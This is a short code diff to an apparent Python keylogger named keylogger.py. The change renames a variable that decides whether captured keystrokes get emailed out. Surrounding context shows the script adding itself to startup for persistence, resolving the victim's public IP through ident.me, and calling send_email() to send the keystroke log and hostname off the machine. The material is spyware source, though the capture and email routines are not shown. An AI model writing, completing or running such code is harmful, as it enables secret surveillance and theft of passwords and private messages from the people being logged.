@@ -28,10 +28,10 @@ HOSTNAME = socket.gethostname()
 SUBJECT = HOSTNAME + " // keylogger.py"     # Specify email subject
 try:
     PUBLIC_IP = urllib.request.urlopen('https://ident.me').read().decode('utf8')
-    email_logs = True
+    internet_conn = True
     logger.info("Public ip address resolved")
 except urllib.error.URLError:
-    email_logs = False
+    internet_conn = False
     PUBLIC_IP = None
     logger.warning("https://ident.me could not be reached")
     
@@ -144,7 +144,7 @@ logger.info("PKEYLOGGER START]")
 add_startup()
 
 # Clear previous log only if it has aready been sent via email
-if email_logs:
+if internet_conn:
     with open("keylogs.txt", "w") as f:
         f.close()
 
@@ -176,5 +176,5 @@ log("-----------------------------\n")
 # ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)
 
 # Send email once log is closed
-if email_logs:
+if internet_conn:
     send_email()
